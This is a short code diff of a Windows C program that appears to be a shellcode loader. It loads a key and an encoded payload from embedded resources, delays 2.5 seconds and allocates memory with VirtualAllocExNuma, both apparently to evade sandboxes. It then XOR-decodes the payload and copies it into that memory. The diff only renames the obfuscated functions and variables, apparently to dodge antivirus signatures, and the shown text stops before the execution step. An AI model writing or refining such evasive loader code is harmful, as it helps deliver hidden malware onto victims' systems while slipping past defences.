@@ -20,9 +20,9 @@ void resloamadappa(const char* enapparename, char** data, DWORD* size) {
 
 
 
-void daggerman1999kum(char* coddmanku1, DWORD lenofcod1, unsigned char* ke44y5, DWORD k2e3y1en) {
-    for (DWORD ma1su = 0; ma1su < lenofcod1; ma1su++) {
-        coddmanku1[ma1su] ^= ke44y5[ma1su % k2e3y1en]; 
+void callingthefunc_enc(char* coddmanku1, DWORD lenofcod1, unsigned char* ke44y5, DWORD k2e3y1en) {
+    for (DWORD a = 0; a < lenofcod1; a++) {
+        coddmanku1[a] ^= ke44y5[a % k2e3y1en]; 
     }
 }
 
@@ -30,17 +30,16 @@ void daggerman1999kum(char* coddmanku1, DWORD lenofcod1, unsigned char* ke44y5, 
 int main() {
     Sleep(2500);
 
-    char* kkeyakesey;
-    DWORD kkeyakeseyLen;
-    resloamadappa("dhanushkey1", &kkeyakesey, &kkeyakeseyLen);
+    char* keu789;
+    DWORD keu789Len;
+    resloamadappa("dhanushkey1", &keu789, &keu789Len);
 
     char* kkcode;
     DWORD kkcodeLen;
     resloamadappa("dhanushcode56", &kkcode, &kkcodeLen);
 
     LPVOID sirajpura = VirtualAllocExNuma(GetCurrentProcess(), NULL, kkcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
-    //dhanushaes(AESCode, AESCodeLen, AESkey, AESkeyLen);
-    daggerman1999kum(kkcode, kkcodeLen, kkeyakesey , kkeyakeseyLen);
+    callingthefunc_enc(kkcode, kkcodeLen, keu789 , keu789Len);
 
     memcpy(sirajpura, kkcode, kkcodeLen);
     DWORD oldProtect;
